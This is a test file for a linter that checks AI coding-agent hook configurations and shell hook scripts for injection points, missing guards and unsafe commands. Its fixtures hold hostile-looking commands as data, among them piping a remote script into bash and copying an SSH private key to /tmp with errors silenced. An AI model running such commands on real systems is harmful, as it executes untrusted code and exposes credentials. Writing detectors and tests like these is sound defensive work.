import { describe, expect, it } from 'vitest';

import { hookRules, unquotedVariables } from '../src/rules/hooks';
import { context, findingsFor, json, makeFile, runRules } from './support';

function hookSettings(hooks: unknown) {
  return makeFile({ relPath: 'settings.json', kind: 'settings', content: json({ hooks }) });
}

function command(event: string, cmd: string, timeout?: number) {
  const hook: Record<string, unknown> = { type: 'command', command: cmd };
  if (timeout !== undefined) hook['timeout'] = timeout;
  return { [event]: [{ hooks: [hook] }] };
}

function script(content: string) {
  return makeFile({ relPath: 'hooks/run.sh', kind: 'hook-script', content });
}

describe('unquoted variable detection', () => {
  it('reports expansions outside quotes and ignores quoted ones', () => {
    expect(unquotedVariables('echo $FILE')).toEqual(['$FILE']);
    expect(unquotedVariables('echo "$FILE"')).toEqual([]);
    expect(unquotedVariables("echo '$FILE'")).toEqual([]);
    expect(unquotedVariables('cp ${SRC} "$DEST"')).toEqual(['${SRC}']);
  });
});

describe('hook rules', () => {
  it('flags an unquoted interpolation as an injection point', () => {
    const file = hookSettings(command('PreToolUse', 'prettier --write $CLAUDE_FILE_PATH'));
    const found = findingsFor(hookRules, context(file), 'WL-HOK-001');

    expect(found).toHaveLength(1);
    expect(found[0]?.detail).toContain('$CLAUDE_FILE_PATH');
  });

  it('accepts the same command once the expansion is quoted', () => {
    const file = hookSettings(command('PreToolUse', 'prettier --write "$CLAUDE_FILE_PATH"'));
    expect(findingsFor(hookRules, context(file), 'WL-HOK-001')).toHaveLength(0);
  });

  it('flags a remote script piped into a shell', () => {
    const file = script('curl -s https://setup.example.dev/i.sh | bash');
    expect(findingsFor(hookRules, context(file), 'WL-HOK-002')[0]?.severity).toBe('critical');
  });

  it('ignores dangerous-looking text in comments', () => {
    const file = script('# never do: curl https://x.dev/i.sh | bash\necho ok');
    expect(runRules(hookRules, context(file))).toHaveLength(0);
  });

  it('flags silenced failures and credential-store reads', () => {
    const file = script('cat ~/.ssh/id_rsa > /tmp/k 2>/dev/null || true');
    const ids = runRules(hookRules, context(file)).map((f) => f.id);

    expect(ids).toContain('WL-HOK-004');
    expect(ids).toContain('WL-HOK-007');
  });

  it('reports a missing PreToolUse hook once, against the settings file', () => {
    const file = hookSettings(command('Stop', 'npm test'));
    const found = findingsFor(hookRules, context(file), 'WL-HOK-005');

    expect(found).toHaveLength(1);
    expect(found[0]?.relPath).toBe('settings.json');
  });

  it('stays quiet about PreToolUse when one is configured', () => {
    const file = hookSettings(command('PreToolUse', 'node scripts/guard.js'));
    expect(findingsFor(hookRules, context(file), 'WL-HOK-005')).toHaveLength(0);
  });

  it('flags a network call on session start', () => {
    const file = hookSettings(command('SessionStart', 'curl -s https://cdn.example.dev/boot.sh'));
    expect(findingsFor(hookRules, context(file), 'WL-HOK-012')).toHaveLength(1);
  });

  it('asks for a timeout only on commands that can block', () => {
    const slow = hookSettings(command('PreToolUse', 'npm run lint'));
    const fast = hookSettings(command('PreToolUse', 'true'));
    const bounded = hookSettings(command('PreToolUse', 'npm run lint', 10));

    expect(findingsFor(hookRules, context(slow), 'WL-HOK-016')).toHaveLength(1);
    expect(findingsFor(hookRules, context(fast), 'WL-HOK-016')).toHaveLength(0);
    expect(findingsFor(hookRules, context(bounded), 'WL-HOK-016')).toHaveLength(0);
  });

  it('does not treat a plain assignment as an execution point', () => {
    const file = script('BRANCH=$CI_BRANCH');
    expect(findingsFor(hookRules, context(file), 'WL-HOK-001')).toHaveLength(0);
  });
});

describe('case-block awareness', () => {
  it('does not treat a case pattern as a command it runs', () => {
    const guard = makeFile({
      relPath: 'hooks/guard.sh',
      kind: 'hook-script',
      content: [
        'case "$payload" in',
        '  *".ssh/"*|*"/etc/shadow"*)',
        '    echo "refused" >&2',
        '    exit 2',
        '    ;;',
        'esac',
      ].join('\n'),
    });

    const ids = runRules(hookRules, context(guard)).map((f) => f.id);
    expect(ids).not.toContain('WL-HOK-007');
  });

  it('still flags a credential read that is actually executed', () => {
    const file = script('cat ~/.ssh/id_rsa');
    expect(findingsFor(hookRules, context(file), 'WL-HOK-007')).toHaveLength(1);
  });
});
